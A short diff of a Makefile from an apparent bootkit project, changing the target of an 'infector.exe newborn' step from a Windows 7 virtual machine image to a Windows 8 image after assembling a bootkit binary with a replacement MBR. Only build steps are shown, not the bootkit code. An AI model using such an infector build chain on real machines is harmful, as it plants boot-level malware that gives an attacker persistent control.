@@ -1,6 +1,6 @@
 all:bootkit_all.bin
 	@echo "success, you can run now"
-	./infector.exe  newborn "D:\Program Files\Oracle\VirtualBox\win7_32.img"
+	./infector.exe  newborn "E:\vms\Windows 8.x x64\win8_x64.img"
 
 bootkit_all.bin: newmbr.bin bootkit0_2_7c00_2.bin  bootkit_all.asm
 	@echo build bootkit_all.asm
